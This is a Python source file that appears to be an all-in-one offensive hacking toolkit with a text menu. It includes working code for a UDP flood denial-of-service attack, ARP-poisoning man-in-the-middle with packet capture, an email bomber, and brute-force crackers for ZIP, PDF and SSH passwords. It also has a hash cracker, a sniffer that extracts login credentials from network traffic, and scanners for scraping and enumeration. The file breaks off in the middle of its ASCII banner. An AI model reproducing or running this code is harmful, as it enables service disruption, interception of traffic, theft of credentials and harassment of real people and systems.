import paramiko
import requests
import multiprocessing
import netaddr
from urllib.request import urlopen
import requests.exceptions
import zipfile
import requests.exceptions
from urllib.parse import urlsplit
from bs4 import BeautifulSoup
from getmac import get_mac_address
import smtplib
from urllib import parse
import hashlib
import pikepdf
from colorama import *
from scapy.all import *
from scapy.layers.inet import ICMP, TCP
from scapy.layers.l2 import Ether, ARP

logging.getLogger("scapy.runtime").setLevel(logging.ERROR)
conf.verb = 0

################################################################################################################

def DoSAttack():

    try:
        sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        bytes = random._urandom(1024)

        os.system("clear")
        print("WELCOME TO DOS ATTACK")
        print("")
        ip = input("TARGET IP: ")
        port = int(input("PORT : "))
        duration = input("TIME: ")
        timeout = time.time() + float(duration)
        sent = 0

        while True:
            try:
                if time.time() > timeout:
                    break
                else:
                    pass
                sock.sendto(bytes, (ip, port))
                sent = sent + 1
                print("Sent %s packets to %s through port %s" % (sent, ip, port))
            except KeyboardInterrupt:
                sys.exit()
                init()
        init()

    except:
        print("")
        print("...")
        print("")
        init()

################################################################################################################

def WebScraper():
    class RegEx:
        def __init__(self, pattern, desc):
            self.pattern = pattern
            self.desc = desc

    rgxEmail = RegEx(r"[a-z0-9\.\-+_]+@[a-z0-9\.\-+_]+\.[a-z]+", "Emails")
    rgxPhone = RegEx(r"\b\d{3}[-.]?\d{3}[-.]?\d{4}\b", "Phone Numbers")
    rgxIP = RegEx(r"\b\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3}\b", "IP Addresses")
    rgxWord = RegEx(r"[a-zA-Z]+", "Words")

    def scrapeURL(url, rgx):
        try:
            src = requests.get(url.strip())
            for rg in rgx:
                print("[*] Scraping " + rg.desc + " from " + url.strip())
                res = set(re.findall(rg.pattern, src.text, re.I))
                for dat in res:
                    print(dat)
        except Exception as err:
            print(str(err))

    def scrapeFile(fle, rgx):
        try:
            with open(fle) as fh:
                for url in fh:
                    scrapeURL(url, rgx)
        except Exception as err:
            print(str(err))

    def main(url, action):
        rgx = []
        isFile = True
        if url.lower().startswith("http"):
            isFile = False
        if action.lower() == "e":  # scrape emails
            rgx = [rgxEmail]
        elif action.lower() == "p":  # scrape phone #
            rgx = [rgxPhone]
        elif action.lower() == "w":  # scrape words
            rgx = [rgxWord]
        elif action.lower() == "i":  # scrape IP
            rgx = [rgxIP]
        elif action.lower() == "a":  # scrape everything
            rgx = [rgxEmail, rgxPhone, rgxWord, rgxIP]

        if isFile:
            scrapeFile(url, rgx)
        else:
            scrapeURL(url, rgx)

        print("================================================")

    print("WELCOME TO WEBSCRAPER - SCRAPE PHONENUMBERS,EMAIL ADRESSES, WORDS AND IP ADRESSES")
    print("")

    url = input("ENTER WEBSITE URL (example : https://google.com) : ")
    action = input("CHOOSE AN ACTION (a = all, p = phone, w = words, i = IP) : ")
    if (action != "a" and action != "p" and action != "w" and action != "i"):
        print("")
        print("INVALID ACTION")
        init()
    else:
        main(url, action)
        init()

################################################################################################################

def HostDiscovery():
    class const:
        ARP = 0
        PING = 1
        TCP = 2
        ALL = 3

    def arpScan(subnet):
        try:
            ans, unans = srp(Ether(dst="ff:ff:ff:ff:ff:ff") / ARP(pdst=subnet), timeout=2)
            for snd, rcv in ans:
                print(rcv.sprintf(r"[ARP] Online: %ARP.psrc% - %Ether.src%"))
        except:
            print("arp scan error...")

    def ping(ip):
        try:
            reply = sr1(IP(dst=str(ip)) / ICMP(), timeout=3)
            if reply is not None:
                print("[PING] Online: " + str(ip))
        except:
            print("ping error...")

    def tcp(ip):
        try:
            port = 53
            srcp = RandShort()
            pkt = sr1(IP(dst=str(ip)) / TCP(sport=srcp, dport=port, flags="S"), timeout=5)
            if pkt is not None:
                flag = pkt.getlayer(TCP).flags
                if flag == 0x12:  # syn,ack
                    print("[TCP] Online:" + str(ip) + " - replied with syn,ack")
                    send(IP(dst=str(ip)) / TCP(sport=srcp, dport=port, flags="R"))
                elif flag == 0x14:  # RST
                    print("[TCP] Online: " + str(ip) + " - replied with rst,ack")
        except:
            print("tcp scan error...")

    def scan(subnet, typ):
        try:
            jobs = []
            for ip in subnet:
                if typ == const.PING:
                    p = multiprocessing.Process(target=ping, args=(ip,))
                    jobs.append(p)
                    p.start()
                else:
                    p = multiprocessing.Process(target=tcp, args=(ip,))
                    jobs.append(p)
                    p.start()

            for j in jobs:
                j.join()
        except:
            print("...")

    def main(subnet, argument):
        try:
            sbnt = netaddr.IPNetwork(subnet)
            start = datetime.now()
            print("==================================================")
            print("Scanning " + str(sbnt[0]) + " to " + str(sbnt[-1]))
            print("Started at " + str(start))
            print("==================================================")

            if argument == const.ARP:
                arpScan(subnet)
            elif argument == const.PING:
                scan(sbnt, const.PING)
            elif argument == const.TCP:
                scan(sbnt, const.TCP)
            elif argument == const.ALL:
                arpScan(subnet)
                scan(sbnt, const.PING)
                scan(sbnt, const.TCP)
            else:
                print("INVALID ARGUMENT")
                init()

            stop = datetime.now()
            print("==================================================")
            print("Scan Duration: " + str(stop - start))
            print("Completed at " + str(stop))
            print("==================================================")
        except:
            print("...")
            init()

    try:
        print("")
        print("WELCOME TO 3-WAY HOST DISCOVERY (ARP, PING, TCP)")
        print("")
        subnet = input("SUBNET TO SCAN (example : 10.2.1.0/24) : ")
        argument = int(input("CHOOSE AN OPTION (0 = Arp, 1 = Ping, 2 = TCP, 3 = ALL) : "))
        main(subnet, argument)
        init()
    except:
        print("")
        print("an error occured...")
        init()

################################################################################################################

def BannerGrabber():

    def scan(ip, port):
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.settimeout(2.0)
            res = s.connect_ex((ip, port))
            if res == 0:
                if port == 80:
                    rsp = "HEAD / HTTP/1.1\r\nhost: " + ip + "\r\n\r\n"
                    s.send(rsp.encode())
                banner = s.recv(4096)
                msg = "[+] Port " + str(port) + " open\n"
                msg += "------------------------\n" + banner.strip().decode()
                print(msg + "\n------------------------\n")
            s.close()
        except socket.timeout:
            banner = "No Banner Message"
            if port == 53:
                banner = subprocess.getoutput("nslookup -type=any -class=chaos version.bind " + ip)
            msg = "[+] Port " + str(port) + " open\n"
            msg += "------------------------\n" + banner.strip().decode()
            print(msg + "\n------------------------\n")
            s.close()

    def main(ip,sport,eport):
        try:
            start = datetime.now()
            print("==================================================")
            print("Scanning " + ip + " Ports: " + str(sport) + " - " + str(eport))
            print("==================================================\n")
            ports = range(sport, eport + 1)
            for port in ports:
                p = multiprocessing.Process(target=scan, args=(ip, port,))
                p.start()
                time.sleep(1)
            time.sleep(3)
            stop = datetime.now()
            print("==================================================")
            print("Scan Duration: " + str(stop - start))
            print("==================================================")
        except Exception as err:
            print(str(err))

    try:
        print("")
        print("WELCOME TO BANNER GRABBER")
        print("")
        ip = input("IP ADDRESS : ")
        sport = int(input("START PORT : "))
        eport = int(input("END PORT : "))
        main(ip,sport,eport)
        init()
    except:
        print("")
        print("an error occured...")
        init()

################################################################################################################

def MITMTool():
    def ip2mac(ip):
        try:
            mac = get_mac_address(ip)
            return str(mac)
        except:
            print("ip to mac error...")
            init()

    def arpPoison(gateIp, gateMac, targetIp, targetMac):
        try:
            if(gateIp != None and gateMac != None and targetIp != None and targetMac != None and gateIp != "" and gateMac != "" and targetIp != "" and targetMac != ""):
                while True:
                    try:
                        print("[*] ARP poisoning [CTRL-C to stop]")
                        send(ARP(op=2, psrc=gateIp, pdst=targetIp, hwdst=targetMac))
                        send(ARP(op=2, psrc=targetIp, pdst=gateIp, hwdst=gateMac))
                        time.sleep(2)
                    except:
                        init()
                        break
            else:
                print("INVALID PARAMETER INPUTS")
                init()
        except:
            print("arp poisoning error...")
            #init()

    def arpRestore(gateIp, gateMac, targetIp, targetMac):
        try:
            for x in range(5):
                print("[*] Restoring ARP table [" + str(x) + " of 4]")
                send(ARP(op=2, psrc=gateIp, pdst=targetIp, hwdst="ff:ff:ff:ff:ff:ff", hwsrc=gateMac), count=5)
                send(ARP(op=2, psrc=targetIp, pdst=gateIp, hwdst="ff:ff:ff:ff:ff:ff", hwsrc=targetMac), count=5)
                time.sleep(2)
        except:
            print("arp restore error...")
            #init()


    def start():

        interface = input("INTERFACE (example : eth0) : ")
        targetIP = input("TARGET IP (example : 10.2.1.16) : ")
        gateIP = input("GATEWAY (example : 10.2.1.1) : ")

        packets = 99999
        logfile = "mitmLogCloverfield.pcap"
        bcast = "ff:ff:ff:ff:ff:ff"

        conf.iface = interface
        conf.verb = 0
        gateMac = ip2mac(gateIP)
        targetMac = ip2mac(targetIP)
        print("[*] Interface: " + interface)
        print("[*] Gateway: " + gateIP + " [" + gateMac + "]")
        print("[*] Target: " + targetIP + " [" + targetMac + "]")
        print("[*] Enabling Packet Forwarding")
        os.system("/sbin/sysctl -w net.ipv4.ip_forward=1 >/dev/null 2>&1")

        p = multiprocessing.Process(target=arpPoison, args=(gateIP, gateMac, targetIP, targetMac,))
        p.start()

        print("[*] Sniffing Packets")
        packets = sniff(count=packets, filter=("ip host " + targetIP), iface=interface)
        wrpcap(logfile, packets)
        p.terminate()
        print("[*] Sniffing Complete")

        print("[*] Disable Packet Forwarding")
        os.system("/sbin/sysctl -w net.ipv4.ip_forward=0 >/dev/null 2>&1")
        arpRestore(gateIP, gateMac, targetIP, targetMac)
        print("[*] Exiting")
        init()



    try:
        start()
    except:
        print("an error occured...")
        init()
################################################################################################################

def WebServerDirAndFileEnumerator():

    def request(url):
        try:
            agent = {
                "User-Agent": ("Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_1) "
                               "AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2227.1 Safari/537.36")
            }
            rsp = requests.get(url)
            if rsp.status_code != 404:
                print("[+] Status " + str(rsp.status_code) + ": " + url)
        except Exception as err:
            print(str(err))
            init()

    def scan(url, word, ext):
        try:
            turl = "http://" + url + word.rstrip()
            request(turl)
            if ext:
                request(turl + ext)
        except:
            print("...")

    def main(URL,wordList,extension):
        try:
            start = datetime.now()
            print("==================================================")
            print("Started at " + str(start))
            print("==================================================")
            if URL.endswith("/") == False: URL += "/"
            with open(wordList) as fle:
                for word in fle:
                    if word.startswith("#") == False:
                        p = multiprocessing.Process(target=scan, args=(URL, word, extension))
                        p.start()
            stop = datetime.now()
            print("==================================================")
            print("Scan Duration: " + str(stop - start))
            print("Completed at " + str(stop))
            print("==================================================")
        except:
            print("...")
            init()

    def FindURLPaths(URL):
        try:
            url = str(URL)
            new_urls = deque([url])
            processed_urls = set()
            local_urls = set()
            foreign_urls = set()
            broken_urls = set()

            while len(new_urls):
                url = new_urls.popleft()
                processed_urls.add(url)
                print("Processing %s" % url)
                try:
                    response = requests.get(url)
                except (
                requests.exceptions.MissingSchema, requests.exceptions.ConnectionError, requests.exceptions.InvalidURL,
                requests.exceptions.InvalidSchema):
                    broken_urls.add(url)
                    continue

                parts = urlsplit(url)
                base = "{0.netloc}".format(parts)
                strip_base = base.replace("www.", "")
                base_url = "{0.scheme}://{0.netloc}".format(parts)
                path = url[:url.rfind('/') + 1] if '/' in parts.path else url
                soup = BeautifulSoup(response.text, "lxml")

                for link in soup.find_all('a'):
                    anchor = link.attrs["href"] if "href" in link.attrs else ''

                    if anchor.startswith('/'):
                        local_link = base_url + anchor
                        local_urls.add(local_link)
                    elif strip_base in anchor:
                        local_urls.add(anchor)
                    elif not anchor.startswith('http'):
                        local_link = path + anchor
                        local_urls.add(local_link)
                    else:
                        foreign_urls.add(anchor)

                    for i in local_urls:
                        if not i in new_urls and not i in processed_urls:
                            new_urls.append(i)

            print(processed_urls)

        except:
            print("...")
            init()

    try:
        print("CHOOSE AN OPTION : ")
        print("")
        print("1 - FIND SPECIFIC URL PATH BY WORDLIST FILE")
        print("2 - FIND PATHS FROM URL")
        opt = int(input(""))

        if(opt == 1):
            URL = input("URL : ")
            wordList = input("WORDLIST : ")
            extension = input("EXTENSION : ")
            main(URL,wordList,extension)
            print("")
            print("Loading...")
            time.sleep(3)
            init()
        elif(opt == 2):
            URL = input("URL : ")
            FindURLPaths(URL)
            print("")
            print("Loading...")
            time.sleep(3)
            init()
        else:
            print("INVAlID OPTION")
    except:
        print("an error occured...")
        init()

################################################################################################################

def EmailBomber():

    class Email_Bomber:
        count = 0

        def __init__(self):
            try:
                print('\nSTARTING EMAIL BOMBER...')
                self.target = str(input('ENTER TARGET EMAIL : '))
                self.mode = int(
                    input('CHOOSE AN OPTION : \n1 - 1000 \n2 - 500 \n3 - 250 \n4 - CUSTOM AMOUNT \n'))
                if int(self.mode) > int(4) or int(self.mode) < int(1):
                    print('INVALID OPTION')
                    init()
            except Exception as e:
                print("")
                print("an error occured...")
                print("")
                init()

        def bomb(self):
            try:
                print('\nEMAIL BOMBER')
                self.amount = None
                if self.mode == int(1):
                    self.amount = int(1000)
                elif self.mode == int(2):
                    self.amount = int(500)
                elif self.mode == int(3):
                    self.amount = int(250)
                else:
                    self.amount = int(input('CHOOSE CUSTOM AMOUNT : '))
                print(
                    f'\nYOU HAVE CHOSEN OPTION : {self.mode} AND {self.amount} AMOUNT OF EMAIL(S) TO SEND')
            except Exception as e:
                print("")
                print('an error occured...')
                print("")
                init()

        def email(self):
            try:
                print('\nSETTING UP EMAAIL...')
                self.server = str(input('ENTER EMAIL SERVER OR CHOOSE AN OPTION :  \n1:GMAIL \n2:YAHOO \n3:Outlook \n'))
                premade = ['1', '2', '3']
                default_port = True
                if self.server not in premade:
                    default_port = False
                    self.port = int(input('ENTER PORT NUMBER : '))

                if default_port == True:
                    self.port = int(587)

                if self.server == '1':
                    self.server = 'smtp.gmail.com'
                elif self.server == '2':
                    self.server = 'smtp.mail.yahoo.com'
                elif self.server == '3':
                    self.server = 'smtp-mail.outlook.com'

                self.fromAddr = str(input('ENTER FROM ADDRESS : '))
                self.fromPwd = str(input('ENTER FROM PASSWORD : '))
                self.subject = str(input('ENTER SUBJECT : '))
                self.message = str(input('ENTER MESSAGE : '))

                self.msg = '''From: %s\nTo: %s\nSubject %s\n%s\n
                ''' % (self.fromAddr, self.target, self.subject, self.message)

                self.s = smtplib.SMTP(self.server, self.port)
                self.s.ehlo()
                self.s.starttls()
                self.s.ehlo()
                self.s.login(self.fromAddr, self.fromPwd)
            except Exception as e:
                print("")
                print('an error occured...')
                print("")
                init()

        def send(self):
            try:
                self.s.sendmail(self.fromAddr, self.target, self.msg)
                print(f'BOMB: {self.count}')
                self.count += 1
            except Exception as e:
                print("")
                print('an error occured...')
                print("")
                init()


        def attack(self):
            print('\nATTACKING...')
            for email in range(self.amount):
                self.send()
            self.s.close()
            print('\nATTACK FINISHED')
            init()


    try:
        bomb = Email_Bomber()
        bomb.bomb()
        bomb.email()
        bomb.attack()
    except:
        print("")
        print("an error occured...")
        print("")
        init()

################################################################################################################

def BruteforcePasswordCracker():

    def ZIPCRACK(r):
        charlist = 'abcdefghijklmnopqrstuvwxyz1234567890é@?!çà"§$'
        complete = []

        for current in range(r):
            a = [i for i in charlist]
            for x in range(current):
                a = [y + i for i in charlist for y in a]
            complete = complete + a
        zipLoc = input("PATH TO ZIP FILE : ")
        z = zipfile.ZipFile(zipLoc)
        tries = 0

        for passwd in complete:
            try:
                tries += 1
                z.setpassword(passwd.encode('ascii'))
                z.extractall()
                print(f'Password was found after {tries} tries ! The password is : {passwd}')
                init()
            except:
                print("Trying...")
                pass

    def ZIPCRACKBYFILE():
        zipLoc = input("PATH TO ZIP FILE : ")
        z = zipfile.ZipFile(zipLoc)
        tries = 0
        LIST_OF_COMMON_PASSWORDS = str(urlopen(
            'https://raw.githubusercontent.com/danielmiessler/SecLists/master/Passwords/Common-Credentials/10-million-password-list-top-10000.txt').read(),
                                       'utf-8')
        for guess in LIST_OF_COMMON_PASSWORDS.split('\n'):
            try:
                tries +=1
                z.setpassword(guess.encode('utf-8'))
                z.extractall()
                print(f'Password was found after {tries} tries ! The password is : {guess}')
                init()
            except:
                print("Trying...")
                pass

    def PDFCRACK(r):
        charlist = 'abcdefghijklmnopqrstuvwxyz1234567890é@?!çà"§$'
        complete = []
        pdfPath = input("PATH TO PDF FILE : ")

        for current in range(r):
            a = [i for i in charlist]
            for x in range(current):
                a = [y + i for i in charlist for y in a]
            complete = complete + a
        tries = 0

        for passwd in complete:
            try:
                tries += 1
                if (os.path.isfile(pdfPath) and pdfPath[-3:] == "pdf"):
                    pikepdf.open(pdfPath,passwd.strip())
                    print(f'Password was found after {tries} tries ! The password is : {passwd}')
                    init()
                else:
                    print("NOT FOUND")
                    init()
            except:
                print("Trying...")
                pass

    def PDFCRACKBYFILE():
        tries = 0
        pdfPath = input("PATH TO PDF FILE : ")
        LIST_OF_COMMON_PASSWORDS = str(urlopen(
            'https://raw.githubusercontent.com/danielmiessler/SecLists/master/Passwords/Common-Credentials/10-million-password-list-top-10000.txt').read(),
                                       'utf-8')
        for guess in LIST_OF_COMMON_PASSWORDS.split('\n'):
            try:
                tries +=1
                if (os.path.isfile(pdfPath) and pdfPath[-3:] == "pdf"):
                    pikepdf.open(pdfPath,guess.strip())
                    print(f'Password was found after {tries} tries ! The password is : {guess}')
                    init()
                else:
                    print("NOT FOUND")
                    init()
            except:
                print("Trying...")
                pass

    def SSHCRACK(r):
        def ssh_connect(password,code=0):
            SSH = paramiko.SSHClient()
            SSH.set_missing_host_key_policy(paramiko.AutoAddPolicy())

            try:
                SSH.connect(host, port=22, username=username, password=password)
            except paramiko.AuthenticationException:
                code = 1
            except socket.error as e:
                code = 2

            SSH.close()
            return code

        host = input("TARGET IP : ")
        username = input("SSH USERNAME : ")
        charlist = 'abcdefghijklmnopqrstuvwxyz1234567890é@?!çà"§$'
        complete = []

        for current in range(r):
            a = [i for i in charlist]
            for x in range(current):
                a = [y + i for i in charlist for y in a]
            complete = complete + a
        tries = 0

        for passwd in complete:
            try:
                tries += 1
                resp = ssh_connect(passwd)
                if resp == 0:
                    print("")
                    print("FOUND PASSWORD : ", passwd, "\nFOR ACCOUNT : ", username)
                    print("")
                    print(f'Password was found after {tries} tries ! The password is : {passwd}')
                    init()
                    break
                elif resp == 1:
                    print("INCORRECT LOGIN : " + passwd)
                elif resp == 2:
                    print("CAN'T ESTABLISH CONNECTION")
                    init()
                    break
            except:
                print("Trying...")
                pass

    def SSHCRACKBYFILE():
        def ssh_connect(password,code=0):
            SSH = paramiko.SSHClient()
            SSH.set_missing_host_key_policy(paramiko.AutoAddPolicy())
            try:
                SSH.connect(host, port=22, username=username, password=password)
            except paramiko.AuthenticationException:
                code = 1
            except socket.error as e:
                code = 2

            SSH.close()
            return code

        host = input("TARGET IP : ")
        username = input("SSH USERNAME : ")
        file = input("PASSWORD FILE PATH : ")

        def func():

            if os.path.exists(file) == False:
                print("No such file in specified path !")
                sys.exit(1)

            with open(file,"r") as f:
                for line in f.readlines():
                    password = line.strip()
                    try:
                        resp = ssh_connect(password)

                        if resp == 0:
                            print("")
                            print("FOUND PASSWORD : " , password, "\nFOR ACCOUNT : " , username)
                            init()
                            break
                        elif resp == 1:
                            print("INCORRECT LOGIN : " + password)
                        elif resp == 2:
                            print("CAN'T ESTABLISH CONNECTION")
                            init()
                            break
                    except Exception as e:
                        print(e)
                        pass

        func()
    try:
        opt = int(input("CHOOSE AN OPTION \n1 - ZIP PASSWORD CRACK \n2 - PDF PASSWORD CRACK \n3 - SSH PASSWORD CRACK \n"))
        if(opt == 1):
            choose = int(input("CHOOSE OPTION : \n1 - BRUTEFORCE BY STANDARD LOOPING \n2 - BRUTEFORCE BY WORDLIST FILE \n"))
            if(choose == 1):
                r = int(input("CHOOSE RANGE OF WORDS TO BRUTEFORCE (AMOUNTS ABOVE 4 REQUIRE HEAVY PROCESSING) : "))
                if(r > 0):
                    ZIPCRACK(r)
                else:
                    print("INVALID OPTION")
                    init()
            elif(choose == 2):
                ZIPCRACKBYFILE()
            else:
                print("INVALID OPTION")
                init()
        elif(opt ==2):
            choose = int(input("CHOOSE OPTION : \n1 - BRUTEFORCE BY STANDARD LOOPING \n2 - BRUTEFORCE BY WORDLIST FILE \n"))
            if (choose == 1):
                r = int(input("CHOOSE RANGE OF WORDS TO BRUTEFORCE (AMOUNTS ABOVE 4 REQUIRE HEAVY PROCESSING) : "))
                if(r > 0):
                    PDFCRACK(r)
                else:
                    print("INVALID OPTION")
                    init()
            elif (choose == 2):
                PDFCRACKBYFILE()
            else:
                print("INVALID OPTION")
                init()
        elif(opt == 3):
            choose = int(input("CHOOSE OPTION : \n1 - BRUTEFORCE BY STANDARD LOOPING \n2 - BRUTEFORCE BY WORDLIST FILE \n"))
            if (choose == 1):
                r = int(input("CHOOSE RANGE OF WORDS TO BRUTEFORCE (AMOUNTS ABOVE 4 REQUIRE HEAVY PROCESSING) : "))
                if(r > 0):
                    SSHCRACK(r)
                else:
                    print("INVALID OPTION")
                    init()
            elif (choose == 2):
                SSHCRACKBYFILE()
            else:
                print("INVALID OPTION")
                init()
        else:
            print("INVALID OPTION")
            init()
    except:
        print("an error occured...")
        init()

################################################################################################################

def PasswordEncodeDecode():
    def SHA1(password):
        print("")
        print("SHA1 ENCODER")
        setpass = bytes(password, 'utf-8')
        hash_obj = hashlib.sha1(setpass)
        encoded = hash_obj.hexdigest()
        print(encoded)
    def MD5(password):
        print("")
        print("MD5 ENCODER")
        setpass = bytes(password, 'utf-8')
        hash_obj = hashlib.md5(setpass)
        encoded = hash_obj.hexdigest()
        print(encoded)
    def SHA256(password):
        print("")
        print("SHA256 ENCODER")
        setpass = bytes(password, 'utf-8')
        hash_obj = hashlib.sha256(setpass)
        encoded = hash_obj.hexdigest()
        print(encoded)
    def SHA512(password):
        print("")
        print("SHA512 ENCODER")
        setpass = bytes(password, 'utf-8')
        hash_obj = hashlib.sha512(setpass)
        encoded = hash_obj.hexdigest()
        print(encoded)
    def SHA224(password):
        print("")
        print("SHA224 ENCODER")
        setpass = bytes(password, 'utf-8')
        hash_obj = hashlib.sha224(setpass)
        encoded = hash_obj.hexdigest()
        print(encoded)
    def SHA384(password):
        print("")
        print("SHA384 ENCODER")
        setpass = bytes(password, 'utf-8')
        hash_obj = hashlib.sha384(setpass)
        encoded = hash_obj.hexdigest()
        print(encoded)

    def PasswordEncoder():
        option = int(input("CHOOSE HASHING OPTION \n1 - SHA1 \n2 - MD5 \n3 - SHA256 \n4 - SHA512 \n5 - SHA224 \n6 - SHA384 \n7 - ALL \n"))
        if(option < 8 and option > 0):
            password = input("INPUT PASSWORD TO HASH : ")
        else:
            print("INVALID OPTION")
            init()
        if(password != None and password != ""):
            if(option ==1):
                SHA1(password)
                init()
            elif(option == 2):
                MD5(password)
                init()
            elif(option == 3):
                SHA256(password)
                init()
            elif(option == 4):
                SHA512(password)
                init()
            elif(option == 5):
                SHA224(password)
                init()
            elif(option == 6):
                SHA384(password)
                init()
            elif(option == 7):
                SHA1(password)
                SHA224(password)
                SHA256(password)
                SHA512(password)
                SHA384(password)
                MD5(password)
                init()
            else:
                print("INVALID INPUT")
                init()
        else:
            print("INVALID INPUT IS EMPTY")
            init()

    def PasswordDecoder():

        def SHA1(password):
            print("")
            print("SHA1 DECODER")
            LIST_OF_COMMON_PASSWORDS = str(urlopen('https://raw.githubusercontent.com/danielmiessler/SecLists/master/Passwords/Common-Credentials/10-million-password-list-top-10000.txt').read(), 'utf-8')
            for guess in LIST_OF_COMMON_PASSWORDS.split('\n'):
                hashedGuess = hashlib.sha1(bytes(guess, 'utf-8')).hexdigest()

                if hashedGuess == password:
                    print("THE PASSWORD IS :  ", str(guess))
                    init()
                elif hashedGuess != password:
                    print("Password guess ", str(guess)," does not match, trying next...")
            print("")
            print("PASSWORD NOT IN COLLECTION OR WRONG HASH OPTION")
            init()

        def MD5(password):
            print("")
            print("MD5 ENCODER")
            LIST_OF_COMMON_PASSWORDS = str(urlopen(
                'https://raw.githubusercontent.com/danielmiessler/SecLists/master/Passwords/Common-Credentials/10-million-password-list-top-10000.txt').read(),
                                           'utf-8')
            for guess in LIST_OF_COMMON_PASSWORDS.split('\n'):
                hashedGuess = hashlib.md5(bytes(guess, 'utf-8')).hexdigest()

                if hashedGuess == password:
                    print("THE PASSWORD IS :  ", str(guess))
                    init()
                elif hashedGuess != password:
                    print("Password guess ", str(guess), " does not match, trying next...")
            print("")
            print("PASSWORD NOT IN COLLECTION OR WRONG HASH OPTION")
            init()

        def SHA256(password):
            print("")
            print("SHA256 ENCODER")
            LIST_OF_COMMON_PASSWORDS = str(urlopen(
                'https://raw.githubusercontent.com/danielmiessler/SecLists/master/Passwords/Common-Credentials/10-million-password-list-top-10000.txt').read(),
                                           'utf-8')
            for guess in LIST_OF_COMMON_PASSWORDS.split('\n'):
                hashedGuess = hashlib.sha256(bytes(guess, 'utf-8')).hexdigest()

                if hashedGuess == password:
                    print("THE PASSWORD IS :  ", str(guess))
                    init()
                elif hashedGuess != password:
                    print("Password guess ", str(guess), " does not match, trying next...")
            print("")
            print("PASSWORD NOT IN COLLECTION OR WRONG HASH OPTION")
            init()

        def SHA512(password):
            print("")
            print("SHA512 ENCODER")
            LIST_OF_COMMON_PASSWORDS = str(urlopen(
                'https://raw.githubusercontent.com/danielmiessler/SecLists/master/Passwords/Common-Credentials/10-million-password-list-top-10000.txt').read(),
                                           'utf-8')
            for guess in LIST_OF_COMMON_PASSWORDS.split('\n'):
                hashedGuess = hashlib.sha512(bytes(guess, 'utf-8')).hexdigest()
                if hashedGuess == password:
                    print("THE PASSWORD IS :  ", str(guess))
                    init()
                elif hashedGuess != password:
                    print("Password guess ", str(guess), " does not match, trying next...")
            print("")
            print("PASSWORD NOT IN COLLECTION OR WRONG HASH OPTION")
            init()

        def SHA224(password):
            print("")
            print("SHA224 ENCODER")
            LIST_OF_COMMON_PASSWORDS = str(urlopen(
                'https://raw.githubusercontent.com/danielmiessler/SecLists/master/Passwords/Common-Credentials/10-million-password-list-top-10000.txt').read(),
                                           'utf-8')
            for guess in LIST_OF_COMMON_PASSWORDS.split('\n'):
                hashedGuess = hashlib.sha224(bytes(guess, 'utf-8')).hexdigest()
                if hashedGuess == password:
                    print("THE PASSWORD IS :  ", str(guess))
                    init()
                elif hashedGuess != password:
                    print("Password guess ", str(guess), " does not match, trying next...")
            print("")
            print("PASSWORD NOT IN COLLECTION OR WRONG HASH OPTION")
            init()

        def SHA384(password):
            print("")
            print("SHA384 ENCODER")
            LIST_OF_COMMON_PASSWORDS = str(urlopen(
                'https://raw.githubusercontent.com/danielmiessler/SecLists/master/Passwords/Common-Credentials/10-million-password-list-top-10000.txt').read(),
                                           'utf-8')
            for guess in LIST_OF_COMMON_PASSWORDS.split('\n'):
                hashedGuess = hashlib.sha384(bytes(guess, 'utf-8')).hexdigest()
                if hashedGuess == password:
                    print("THE PASSWORD IS :  ", str(guess))
                    init()
                elif hashedGuess != password:
                    print("Password guess ", str(guess), " does not match, trying next...")
            print("")
            print("PASSWORD NOT IN COLLECTION OR WRONG HASH OPTION")
            init()

        option = int(input("CHOOSE DECODING OPTION (BASED ON ONLINE FILE WITH 10.000 PASSWORDS) \n1 - SHA1 \n2 - MD5 \n3 - SHA256 \n4 - SHA512 \n5 - SHA224 \n6 - SHA384 \n"))

        if(option > 0 and option < 7):
            password = input("INPUT HASH TO CRACK : ")
            if (option == 1):
                SHA1(password)
            elif (option == 2):
                MD5(password)
            elif (option == 3):
                SHA256(password)
            elif (option == 4):
                SHA512(password)
            elif (option == 5):
                SHA224(password)
            elif (option == 6):
                SHA384(password)
            else:
                print("INVALID INPUT")
                init()
        else:
            print("INVALID OPTION")
            init()

    try:
        print("WELCOME TO PASSWORD ENCODER/DECODER")
        print("")
        opt = int(input("CHOOSE AN OPTION (1 - ENCODE, 2 - DECODE) : "))
        if(opt == 1):
            PasswordEncoder()
        elif(opt == 2):
            PasswordDecoder()
        else:
            print("INVALID OPTION")
    except:
        print("an error occured...")
        init()

################################################################################################################

def PasswordSnif():
    iface = "eth0"
    def get_login_pass(body):
        user = None
        passwd = None
        userfields = ['log','login','wpname','ahd_username','Username','unickname','nickname','alias','psuedo','email','username','_username','userid','pop_login'
                      'login_id','uname','ulogin','acctname','login_email','account','member','uin','sign-in','session_key']
        passfields = ['ahd_password','pass','password','_password','Password','passwd','userpassword','login_password','passwort','passwrd','wppassword','upasswd','senha']

        for login in userfields:
            login_re = re.search('(%s=[^&]+)' % login, body, re.IGNORECASE)
            if login_re:
                user = login_re.group()
        for passfield in passfields:
            pass_re = re.search('(%s=[^&]+)' % passfield, body, re.IGNORECASE)
            if pass_re:
                passwd = pass_re.group()

        if user and passwd:
            return(user,passwd)

    def pkt_parser(packet):
        if packet.haslayer(TCP) and packet.haslayer(Raw) and packet.haslayer(IP):
            body = str(packet[TCP].payload)
            user_pass = get_login_pass(body)
            if user_pass != None:
                print(packet[TCP].payload)
                print(parse.unquote(user_pass[0]))
                print(parse.unquote(user_pass[1]))
            else:
                pass

    try:
        print("Sniffing... (Ctrl+c to exit program)")
        sniff(iface=iface, prn=pkt_parser,store=0)
    except KeyboardInterrupt:
        print("Exiting...")
        init()


################################################################################################################


def init():
    print(Fore.GREEN + """
    
                                ***          ***
                         ***....**     **...***
                        **........** **.......**
                 ***    **..........*.........**    ***
              **.....**  **..................**  **.....**
            **.........**  **..............**  **.........**
           *..............*   *..........*   *..............*
            **..............*   *......*   *..............**
              **..............** *....* **..............**
                *......................................*
              **..............**........**..............**
            **..............*    *....*....*..............**
           *..............*    *........* ...*..............*
            **.........**    *............* ...**.........**
              **.....**   **...............**....**.....**
                 ***    **...................**...*  ***
                      **...........*...........**...*
                       **.........* *.........**  *...*..*..*..*
                         *......**   **......*      *........*
                           **  *       * **            *...*
                                                         *

           ____ _    ____ _  _ ____ ____ ____ _ ____ _    ___  
           |    |    |  | |  | |___ |__/ |___ | |___ |    |  \ 
